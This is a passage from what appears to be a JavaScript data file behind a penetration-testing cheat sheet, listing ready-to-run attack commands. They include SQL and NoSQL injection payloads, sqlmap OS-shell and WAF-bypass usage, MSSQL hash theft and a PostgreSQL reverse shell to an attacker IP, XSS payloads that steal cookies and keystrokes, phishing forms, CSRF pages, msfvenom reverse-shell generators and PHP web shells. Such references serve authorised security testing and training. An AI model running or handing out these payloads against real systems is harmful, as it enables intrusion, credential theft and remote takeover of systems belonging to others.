          { title: "MySQL Write File", desc: "Write a web shell via SQL injection", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -\"", tags: ["advanced"] },
          { title: "MSSQL Version via UNION", desc: "Extract MSSQL version", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,@@version,3-- -\"", tags: ["essential"] },
          { title: "MSSQL List Databases", desc: "Enumerate MSSQL databases", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,name,3 FROM master.dbo.sysdatabases-- -\"", tags: ["essential"] },
          { title: "MSSQL List Tables", desc: "Enumerate MSSQL tables", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,name,3 FROM <DATABASE>.dbo.sysobjects WHERE xtype='U'-- -\"", tags: ["essential"] },
          { title: "PostgreSQL Version via UNION", desc: "Extract PostgreSQL version", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,version(),NULL-- -\"", tags: ["essential"] },
          { title: "PostgreSQL List Databases", desc: "Enumerate PostgreSQL databases", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,datname,NULL FROM pg_database-- -\"", tags: ["essential"] },
          { title: "PostgreSQL List Tables", desc: "Enumerate PostgreSQL tables", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -\"", tags: ["essential"] },
          { title: "SQLite Version via UNION", desc: "Extract SQLite version", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,sqlite_version(),3-- -\"", tags: ["essential"] },
          { title: "SQLite List Tables", desc: "Enumerate SQLite tables", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -\"", tags: ["essential"] },
          { title: "SQLite Table Schema", desc: "Get table DDL/schema", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='<TABLE>'-- -\"", tags: ["essential"] },
        ]
      },
      {
        name: "Error-Based Extraction",
        commands: [
          { title: "MySQL ExtractValue Error", desc: "Extract data via XML extractvalue error", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- -\"", tags: ["advanced"] },
          { title: "MySQL UpdateXML Error", desc: "Extract data via XML updatexml error", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -\"", tags: ["advanced"] },
          { title: "MySQL Double Query Error", desc: "Error-based extraction via double query", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -\"", tags: ["advanced"] },
          { title: "MSSQL Convert Error", desc: "Extract data via CONVERT type error", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND 1=CONVERT(int,(SELECT @@version))-- -\"", tags: ["advanced"] },
          { title: "PostgreSQL Cast Error", desc: "Extract data via CAST type error", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND 1=CAST((SELECT version()) AS int)-- -\"", tags: ["advanced"] },
        ]
      },
      {
        name: "Blind Boolean Extraction",
        commands: [
          { title: "Boolean Blind Version (MySQL)", desc: "Extract version character by character", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND SUBSTRING(@@version,1,1)='5'-- -\"", tags: ["essential"] },
          { title: "Boolean Blind Database Length", desc: "Determine database name length", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND LENGTH(database())=<NUM>-- -\"", tags: ["essential"] },
          { title: "Boolean Blind Database Name", desc: "Extract database name one character at a time", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND SUBSTRING(database(),<POS>,1)='<CHAR>'-- -\"", tags: ["essential"] },
          { title: "Boolean Blind Table Count", desc: "Count tables in current database", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=<NUM>-- -\"", tags: ["advanced"] },
          { title: "Boolean Blind ASCII Extract", desc: "Extract character via ASCII comparison", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -\"", tags: ["advanced"], note: "Binary search for each character: narrow between 32-127" },
        ]
      },
      {
        name: "Blind Time-Based Extraction",
        commands: [
          { title: "MySQL Time Blind Version", desc: "Time-based version extraction", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)-- -\"", tags: ["essential"] },
          { title: "MySQL Time Blind Database", desc: "Time-based database name extraction", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -\"", tags: ["essential"] },
          { title: "MSSQL Time Blind", desc: "Time-based extraction on MSSQL", cmd: "curl \"http://<TARGET_IP>/page?id=1'; IF(SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:3'-- -\"", tags: ["essential"] },
          { title: "PostgreSQL Time Blind", desc: "Time-based extraction on PostgreSQL", cmd: "curl \"http://<TARGET_IP>/page?id=1'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END-- -\"", tags: ["essential"] },
          { title: "SQLite Time Blind (Heavy Query)", desc: "Time-based extraction on SQLite via heavy query", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND CASE WHEN (SUBSTR((SELECT sqlite_version()),1,1)='3') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END-- -\"", tags: ["advanced"] },
        ]
      },
      {
        name: "SQLMap Automation",
        commands: [
          { title: "SQLMap Basic GET", desc: "Basic SQLi detection on GET parameter", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --batch", tags: ["essential", "tool"] },
          { title: "SQLMap POST Request", desc: "Test POST parameters for SQLi", cmd: "sqlmap -u 'http://<TARGET_IP>/page' --data 'user=admin&pass=test' --batch", tags: ["essential", "tool"] },
          { title: "SQLMap with Cookie", desc: "Test with session cookie", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --cookie='session=<COOKIE>' --batch", tags: ["tool"] },
          { title: "SQLMap from Request File", desc: "Use saved Burp request file", cmd: "sqlmap -r request.txt --batch", tags: ["essential", "tool"], note: "Save request from Burp: Right-click > Save Item" },
          { title: "SQLMap Enumerate Databases", desc: "List all databases", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --dbs --batch", tags: ["essential", "tool"] },
          { title: "SQLMap Enumerate Tables", desc: "List tables in a database", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> --tables --batch", tags: ["essential", "tool"] },
          { title: "SQLMap Enumerate Columns", desc: "List columns in a table", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> -T <TABLE> --columns --batch", tags: ["essential", "tool"] },
          { title: "SQLMap Dump Table", desc: "Dump data from a table", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> -T <TABLE> -C <COL1>,<COL2> --dump --batch", tags: ["essential", "tool"] },
          { title: "SQLMap OS Shell", desc: "Get an interactive OS shell via SQLi", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --os-shell --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap File Read", desc: "Read file from target filesystem", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --file-read='/etc/passwd' --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap File Write", desc: "Write file to target filesystem", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php' --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap Specify Technique", desc: "Use specific injection techniques", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --technique=BEUST --batch", tags: ["tool"], note: "B=Boolean, E=Error, U=Union, S=Stacked, T=Time" },
          { title: "SQLMap with Tamper Script", desc: "Use tamper scripts to bypass WAF", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment,between --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap High Risk/Level", desc: "Maximum injection testing intensity", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --risk=3 --level=5 --batch", tags: ["tool"] },
          { title: "SQLMap Specific DBMS", desc: "Target a specific database type", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --dbms=mysql --batch", tags: ["tool"] },
          { title: "SQLMap Dump All", desc: "Dump entire database", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> --dump-all --batch", tags: ["tool"] },
          { title: "SQLMap Tamper space2comment", desc: "Replace spaces with comments to bypass WAF", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap Tamper charencode", desc: "URL-encode characters to bypass WAF", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=charencode --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap Tamper randomcase", desc: "Randomize SQL keyword case to bypass WAF", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=randomcase --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap Tamper between", desc: "Replace > with BETWEEN to bypass WAF", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=between --batch", tags: ["advanced", "tool"] },
          { title: "SQLMap Tamper Chain (WAF Bypass)", desc: "Chain multiple tamper scripts for aggressive WAF bypass", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment,randomcase,charencode,between --batch --level=5 --risk=3", tags: ["advanced", "tool"] },
          { title: "SQLMap Second-Order SQLi", desc: "Test second-order injection via separate request", cmd: "sqlmap -r inject_request.txt --second-req trigger_request.txt --batch", tags: ["advanced", "tool"], note: "inject_request.txt stores payload, trigger_request.txt retrieves output" },
          { title: "SQLMap with Proxy (Burp)", desc: "Route SQLMap through Burp for inspection", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1' --proxy=http://127.0.0.1:8080 --batch", tags: ["tool"] },
          { title: "SQLMap Custom Injection Point", desc: "Mark custom injection point in request", cmd: "sqlmap -u 'http://<TARGET_IP>/page?id=1*' --batch", tags: ["tool"], note: "Use * to mark the injection point" },
        ]
      },
      {
        name: "MSSQL Techniques",
        commands: [
          { title: "MSSQL Enable xp_cmdshell", desc: "Enable xp_cmdshell for OS command execution", cmds: ["EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"], tags: ["essential"], note: "Requires sysadmin privileges" },
          { title: "MSSQL Execute Command", desc: "Execute OS command via xp_cmdshell", cmd: "EXEC xp_cmdshell 'whoami';", tags: ["essential"] },
          { title: "MSSQL Steal Hash (xp_dirtree)", desc: "Force NTLM authentication to attacker SMB share", cmd: "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';", tags: ["essential"], note: "Catch hash with responder or smbserver" },
          { title: "MSSQL Steal Hash (xp_subdirs)", desc: "Alternative NTLM hash theft", cmd: "EXEC xp_subdirs '\\\\<ATTACKER_IP>\\share';", tags: ["essential"] },
          { title: "MSSQL OPENROWSET Hash Steal", desc: "Force auth via OPENROWSET", cmd: "SELECT * FROM OPENROWSET('SQLOLEDB','Server=<ATTACKER_IP>;uid=sa;pwd=whatever','SELECT 1');", tags: ["advanced"] },
          { title: "MSSQL Linked Servers", desc: "Enumerate linked servers for lateral movement", cmd: "SELECT * FROM sys.servers;", tags: ["advanced"] },
          { title: "MSSQL Impersonate Users", desc: "Check which users can be impersonated", cmd: "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", tags: ["advanced"] },
        ]
      },
      {
        name: "PostgreSQL Techniques",
        commands: [
          { title: "PostgreSQL Read File", desc: "Read files from filesystem", cmd: "SELECT pg_read_file('/etc/passwd');", tags: ["essential"] },
          { title: "PostgreSQL COPY TO File", desc: "Write data to a file", cmd: "COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';", tags: ["advanced"] },
          { title: "PostgreSQL COPY FROM File", desc: "Read file into a table", cmd: "CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;", tags: ["essential"] },
          { title: "PostgreSQL Command Execution", desc: "Execute OS commands via COPY PROGRAM", cmd: "COPY (SELECT '') TO PROGRAM 'id';", tags: ["advanced"], note: "Requires superuser privileges" },
          { title: "PostgreSQL Large Object RCE", desc: "RCE via large objects and lo_export", cmds: ["SELECT lo_import('/etc/passwd');", "SELECT lo_export(<LOID>, '/tmp/out');"], tags: ["advanced"] },
          { title: "PostgreSQL Current User & Roles", desc: "Check current user and role memberships", cmd: "SELECT current_user, current_setting('is_superuser');", tags: ["essential"] },
          { title: "PostgreSQL List Users & Roles", desc: "Enumerate all database users and roles", cmd: "SELECT usename, usecreatedb, usesuper FROM pg_user;", tags: ["essential"] },
          { title: "PostgreSQL UDF Command Execution", desc: "Create a function for OS command execution", cmds: ["CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpythonu;", "SELECT cmd('id');"], tags: ["advanced"], note: "Requires plpythonu extension" },
          { title: "PostgreSQL Reverse Shell", desc: "Reverse shell via COPY PROGRAM", cmd: "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\"';", tags: ["advanced"] },
        ]
      },
      {
        name: "NoSQL Injection",
        commands: [
          { title: "MongoDB Auth Bypass ($ne)", desc: "Bypass login with $ne operator", cmd: "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'", tags: ["essential"] },
          { title: "MongoDB Auth Bypass ($gt)", desc: "Bypass login with $gt operator", cmd: "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}'", tags: ["essential"] },
          { title: "MongoDB Regex Extraction", desc: "Extract data character by character via $regex", cmd: "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}'", tags: ["essential"], note: "Iterate characters: ^a, ^ab, ^abc... until match found" },
          { title: "MongoDB $where JavaScript Injection", desc: "Inject JavaScript in $where operator", cmd: "curl -X POST http://<TARGET_IP>/search -H 'Content-Type: application/json' -d '{\"$where\":\"this.username == \\\"admin\\\" && this.password.match(/^a.*/)\"}' ", tags: ["advanced"] },
          { title: "NoSQL Injection via URL Params", desc: "NoSQL injection through URL-encoded parameters", cmd: "curl 'http://<TARGET_IP>/login?username=admin&password[$ne]=wrong'", tags: ["essential"] },
          { title: "NoSQL Regex Password Extraction", desc: "Extract password length then chars via regex", cmds: ["curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\".{5}\"}}'", "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}'"], tags: ["advanced"], note: "First find length, then brute force each character" },
          { title: "NoSQLMap Automated Testing", desc: "Automated NoSQL injection scanner", cmd: "python nosqlmap.py -u http://<TARGET_IP>/login --data 'username=admin&password=test'", tags: ["tool"] },
          { title: "MongoDB $in Operator Injection", desc: "Use $in to test multiple values at once", cmd: "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]},\"password\":{\"$ne\":\"\"}}'", tags: ["tool"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 5. Browser-Side Exploitation
  // ─────────────────────────────────────────────
  {
    id: "xss-csrf",
    name: "Browser-Side Exploitation",
    icon: "📜",
    description: "Exploit cross-site scripting, cross-site request forgery, and DOM-based vulnerabilities to attack users and their browsers.",
    subcategories: [
      {
        name: "XSS Detection Payloads",
        commands: [
          { title: "XSS Basic Script Tag", desc: "Classic script tag injection", cmd: "<script>alert('XSS')</script>", tags: ["essential"] },
          { title: "XSS IMG Onerror", desc: "XSS via broken image error handler", cmd: "<img src=x onerror=alert('XSS')>", tags: ["essential"] },
          { title: "XSS SVG Onload", desc: "XSS via SVG onload event", cmd: "<svg onload=alert('XSS')>", tags: ["essential"] },
          { title: "XSS Body Onload", desc: "XSS via body onload event", cmd: "<body onload=alert('XSS')>", tags: ["essential"] },
          { title: "XSS Input Onfocus", desc: "XSS via input autofocus", cmd: "<input onfocus=alert('XSS') autofocus>", tags: ["essential"] },
          { title: "XSS Details Tag", desc: "XSS via details/summary toggle", cmd: "<details open ontoggle=alert('XSS')>", tags: ["essential"] },
          { title: "XSS Marquee Tag", desc: "XSS via marquee event", cmd: "<marquee onstart=alert('XSS')>", tags: ["advanced"] },
          { title: "XSS Iframe Injection", desc: "XSS via iframe srcdoc", cmd: "<iframe srcdoc='<script>alert(1)</script>'>", tags: ["advanced"] },
          { title: "XSS Event Handler List", desc: "Common event handlers for XSS", cmds: ["<div onmouseover=alert('XSS')>hover me</div>", "<a href=javascript:alert('XSS')>click</a>", "<select onfocus=alert('XSS') autofocus>", "<textarea onfocus=alert('XSS') autofocus>", "<video><source onerror=alert('XSS')>"], tags: ["essential"] },
          { title: "XSS Polyglot Payload", desc: "Universal XSS polyglot that works in multiple contexts", cmd: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik'telerik\"telerik>telerik<teleriktel eriktel erike rik/teleriktel erike rik\\telerika]telerikb]telerik}telerikb}telerik|telerikb|telerik&telerikb&telerik&&telerikb&&telerikp]telerikb]telerik}telerikb}", tags: ["advanced"], note: "Shortened version: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//" },
        ]
      },
      {
        name: "Session Hijacking",
        commands: [
          { title: "XSS Cookie Steal (Image)", desc: "Steal cookies via Image object", cmd: "<script>new Image().src='http://<ATTACKER_IP>/steal?c='+document.cookie;</script>", tags: ["essential"] },
          { title: "XSS Cookie Steal (Fetch)", desc: "Steal cookies via fetch API", cmd: "<script>fetch('http://<ATTACKER_IP>/steal?c='+document.cookie)</script>", tags: ["essential"] },
          { title: "XSS Cookie Steal (XMLHttpRequest)", desc: "Steal cookies via XHR", cmd: "<script>var x=new XMLHttpRequest();x.open('GET','http://<ATTACKER_IP>/steal?c='+document.cookie);x.send();</script>", tags: ["essential"] },
          { title: "XSS Keylogger Injection", desc: "Inject keylogger to capture input", cmd: "<script>document.onkeypress=function(e){new Image().src='http://<ATTACKER_IP>/log?k='+e.key;}</script>", tags: ["advanced"] },
          { title: "XSS Phishing Login Form", desc: "Inject fake login form to steal creds", cmd: "<script>document.body.innerHTML='<h2>Session Expired</h2><form action=http://<ATTACKER_IP>/phish method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><input type=submit value=Login></form>';</script>", tags: ["advanced"] },
          { title: "XSS Redirect to Attacker", desc: "Redirect victim to attacker-controlled page", cmd: "<script>window.location='http://<ATTACKER_IP>/steal?c='+document.cookie</script>", tags: ["essential"] },
        ]
      },
      {
        name: "Filter Evasion",
        commands: [
          { title: "XSS HTML Entity Encoding", desc: "Bypass filters using HTML entities", cmd: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>", tags: ["advanced"] },
          { title: "XSS URL Encoding", desc: "Bypass WAF with URL-encoded payload", cmd: "%3Cscript%3Ealert(1)%3C%2Fscript%3E", tags: ["advanced"] },
          { title: "XSS Double URL Encoding", desc: "Double-encode to bypass two layers of filtering", cmd: "%253Cscript%253Ealert(1)%253C%252Fscript%253E", tags: ["advanced"] },
          { title: "XSS Unicode Encoding", desc: "Unicode escape for JavaScript execution", cmd: "<script>\\u0061lert(1)</script>", tags: ["advanced"] },
          { title: "XSS Case Variation", desc: "Bypass case-sensitive filters", cmd: "<ScRiPt>alert(1)</sCrIpT>", tags: ["essential"] },
          { title: "XSS Null Byte Injection", desc: "Bypass filters with null byte", cmd: "<scr%00ipt>alert(1)</scr%00ipt>", tags: ["advanced"] },
          { title: "XSS No Parentheses", desc: "XSS without using parentheses", cmd: "<script>alert`1`</script>", tags: ["advanced"] },
          { title: "XSS No Quotes or Slashes", desc: "Payload avoiding quotes and slashes", cmd: "<svg onload=alert(String.fromCharCode(88,83,83))>", tags: ["advanced"] },
          { title: "XSS Script Tag Variations", desc: "Alternative script injection methods", cmds: ["<script/src=http://<ATTACKER_IP>/xss.js>", "<script x>alert(1)</script>", "<script>/**/alert(1)/**/</script>"], tags: ["advanced"] },
          { title: "XSS via JavaScript Protocol", desc: "Inject via javascript: pseudo-protocol", cmd: "<a href='javascript:alert(1)'>click</a>", tags: ["essential"] },
        ]
      },
      {
        name: "DOM-Based Vectors",
        commands: [
          { title: "DOM XSS via location.hash", desc: "Inject via URL fragment", cmd: "http://<TARGET_IP>/page#<img src=x onerror=alert(1)>", tags: ["essential"], note: "Vulnerable if page reads location.hash and writes to DOM" },
          { title: "DOM XSS via document.write", desc: "Exploit document.write with user input", cmd: "http://<TARGET_IP>/page?name=<script>alert(1)</script>", tags: ["essential"], note: "Vulnerable if: document.write(location.search)" },
          { title: "DOM XSS via innerHTML", desc: "Exploit innerHTML assignment with user input", cmd: "http://<TARGET_IP>/page?msg=<img src=x onerror=alert(1)>", tags: ["essential"], note: "Script tags don't execute via innerHTML, use event handlers" },
          { title: "DOM XSS via eval()", desc: "Exploit eval with user-controlled input", cmd: "http://<TARGET_IP>/page?input=alert(1)", tags: ["advanced"], note: "Vulnerable if: eval(userInput)" },
          { title: "DOM XSS via postMessage", desc: "Exploit insecure postMessage handlers", cmd: "<script>window.frames[0].postMessage('<img src=x onerror=alert(1)>','*');</script>", tags: ["advanced"] },
          { title: "DOM Clobbering", desc: "Override DOM properties via element injection", cmd: "<form id=x><input name=y value=overwritten></form>", tags: ["advanced"], note: "Accesses x.y returns 'overwritten' instead of expected value" },
        ]
      },
      {
        name: "CSRF Techniques",
        commands: [
          { title: "CSRF Auto-Submit Form (GET)", desc: "Auto-submit GET request on page load", cmd: "<img src='http://<TARGET_IP>/admin/delete?id=1'>", tags: ["essential"] },
          { title: "CSRF Auto-Submit Form (POST)", desc: "Auto-submit POST form on page load", cmd: "<html><body onload='document.forms[0].submit()'><form action='http://<TARGET_IP>/admin/change-email' method='POST'><input name='email' value='attacker@evil.com'></form></body></html>", tags: ["essential"] },
          { title: "CSRF Password Change", desc: "CSRF to change victim password", cmd: "<html><body onload='document.forms[0].submit()'><form action='http://<TARGET_IP>/change-password' method='POST'><input name='new_password' value='hacked123'><input name='confirm_password' value='hacked123'></form></body></html>", tags: ["essential"] },
          { title: "CSRF via XHR", desc: "CSRF using XMLHttpRequest from XSS", cmd: "<script>var x=new XMLHttpRequest();x.open('POST','http://<TARGET_IP>/admin/adduser');x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('user=hacker&pass=hacker&role=admin');</script>", tags: ["advanced"] },
          { title: "CSRF via Fetch API", desc: "CSRF using fetch from XSS context", cmd: "<script>fetch('http://<TARGET_IP>/api/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>", tags: ["advanced"] },
          { title: "CSRF Token Bypass (Remove)", desc: "Test if CSRF token is actually validated", cmd: "<form action='http://<TARGET_IP>/action' method='POST'><input name='param' value='evil'></form>", tags: ["essential"], note: "Omit the CSRF token entirely — some apps don't validate its absence" },
          { title: "CSRF Token Bypass (Same for All)", desc: "Reuse a previously captured CSRF token", cmd: "<form action='http://<TARGET_IP>/action' method='POST'><input name='csrf' value='<CAPTURED_TOKEN>'><input name='param' value='evil'></form>", tags: ["advanced"], note: "Some apps issue tokens but don't tie them to sessions" },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 6. Payload Engineering & Delivery
  // ─────────────────────────────────────────────
  {
    id: "payload-craft",
    name: "Payload Engineering & Delivery",
    icon: "🖥️",
    description: "Generate reverse shells, bind shells, web shells, and custom payloads for various platforms using msfvenom and other payload generation tools.",
    subcategories: [
      {
        name: "Reverse Shell Payloads (msfvenom)",
        commands: [
          { title: "Windows Reverse Shell EXE", desc: "Generate Windows reverse shell executable", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe", tags: ["essential", "tool"] },
          { title: "Windows Meterpreter EXE", desc: "Generate Windows Meterpreter executable", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter.exe", tags: ["essential", "tool"] },
          { title: "Windows Reverse Shell DLL", desc: "Generate Windows reverse shell DLL", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll", tags: ["tool"] },
          { title: "Linux Reverse Shell ELF", desc: "Generate Linux reverse shell binary", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf", tags: ["essential", "tool"] },
          { title: "Linux Meterpreter ELF", desc: "Generate Linux Meterpreter binary", cmd: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o meterpreter.elf", tags: ["tool"] },
          { title: "PHP Reverse Shell", desc: "Generate PHP reverse shell script", cmd: "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php", tags: ["essential", "tool"] },
          { title: "JSP Reverse Shell", desc: "Generate JSP reverse shell", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp", tags: ["tool"] },
          { title: "WAR Reverse Shell", desc: "Generate WAR file reverse shell for Tomcat", cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war", tags: ["essential", "tool"] },
          { title: "ASP Reverse Shell", desc: "Generate classic ASP reverse shell", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp", tags: ["tool"] },
          { title: "ASPX Reverse Shell", desc: "Generate ASPX reverse shell", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx", tags: ["essential", "tool"] },
          { title: "Python Reverse Shell", desc: "Generate Python reverse shell payload", cmd: "msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw", tags: ["tool"] },
          { title: "Bash Reverse Shell", desc: "Generate Bash reverse shell payload", cmd: "msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw", tags: ["tool"] },
          { title: "PowerShell Reverse Shell", desc: "Generate PowerShell reverse shell payload", cmd: "msfvenom -p cmd/windows/reverse_powershell LHOST=<LHOST> LPORT=<LPORT> -f raw", tags: ["tool"] },
        ]
      },
      {
        name: "Staged vs Stageless",
        commands: [
          { title: "Staged Payload (Windows)", desc: "Generate staged payload — smaller, needs handler", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o staged.exe", tags: ["essential", "tool"], note: "Staged: / in payload name (reverse_tcp). Downloads second stage from handler." },
          { title: "Stageless Payload (Windows)", desc: "Generate stageless payload — self-contained", cmd: "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o stageless.exe", tags: ["essential", "tool"], note: "Stageless: _ in payload name (reverse_tcp). Contains full payload — larger but more reliable." },
          { title: "Staged Payload (Linux)", desc: "Generate staged Linux payload", cmd: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o staged.elf", tags: ["tool"] },
          { title: "Stageless Payload (Linux)", desc: "Generate stageless Linux payload", cmd: "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o stageless.elf", tags: ["tool"] },
          { title: "List Available Payloads", desc: "Show all available msfvenom payloads", cmd: "msfvenom --list payloads", tags: ["essential", "tool"] },
          { title: "List Available Encoders", desc: "Show all available payload encoders", cmd: "msfvenom --list encoders", tags: ["tool"] },
          { title: "List Available Formats", desc: "Show all available output formats", cmd: "msfvenom --list formats", tags: ["tool"] },
        ]
      },
      {
        name: "Web Shells",
        commands: [
          { title: "PHP One-Liner Shell", desc: "Minimal PHP web shell", cmd: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php", tags: ["essential"] },
          { title: "PHP Passthru Shell", desc: "PHP shell using passthru()", cmd: "echo '<?php passthru($_GET[\"cmd\"]); ?>' > shell.php", tags: ["essential"] },
          { title: "PHP Shell_Exec Shell", desc: "PHP shell using shell_exec()", cmd: "echo '<?php echo shell_exec($_GET[\"cmd\"]); ?>' > shell.php", tags: ["essential"] },
